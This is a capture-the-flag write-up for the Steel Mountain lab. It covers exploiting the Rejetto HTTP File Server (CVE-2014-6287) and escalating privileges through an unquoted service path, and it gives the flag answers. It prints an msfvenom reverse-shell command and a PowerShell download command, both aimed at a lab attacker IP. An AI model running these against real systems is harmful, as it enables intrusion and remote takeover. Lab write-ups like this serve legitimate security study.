# Steel Mountain

## Introduction

**Questions**

    1. Who is the employee of the month?

Bill Harper

## Initial Access

**Questions**

    1. Scan the machine with nmap .What is the other port running a web server on?

8080

Default nmap scan did not pick this up for some reason. Using `-p-` was able to show this port too.

    2. Take a look at the other web server. What file server is running?

Rejetto HTTP File Server

    3. What is the CVE number to exploit this file server?

2014-6287

    4. Use Metasploit to get an initial shell. What is the user flag?

b04763b6fcf51fcd7c13abc7db4fd365

Found on the desktop.

## Privilege Escalation

Now that we have a shell, lets try and escalate privileges to root. Enumerate with the `PowerUp.ps1` script.

So this was a total disaster for me. Powershell seemed ridiculously unstable and would freeze. In fact it took multiple attempts to run the script.

It found the AdvancedSystemCareService9 service could be stopped and started. This allowed me to create a reverse shell payload with `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.32.89 LPORT=8888 -e x86/shikata_ga_nai -f exe -o ASCService.exe`.

The service can then be stopped with `sc stop AdvancedSystemCareService9`. Uploading the created executable and restarting the service returned a root shell.

**Questions**

    1. Take close attention to the CanRestart option that is set to true. What is the name of the name of the service which shows up as an unquoted service path vulnerability?

AdvancedSystemCareService9

    2. What is the root flag?

9af5f314f57607c00fd09803a587db80

## Access and Escalation Without Metasploit

Use the exploit.py script to get onto the machine.

Once on the machine use the command `powershell -c wget "http://10.11.32.89:80/winPEAS.exe" -outfile "winPEAS.exe"` in order to copy winPEAS over.

Execute winPEAS. Notice it spots the same exploit previously used.

Now we can stop the service and copy over the malware through wget again in order to gain administrator access.

**Questions**

    1. What powershell -c command could we run to manually find out the service name?

`powershell -c Get-Service`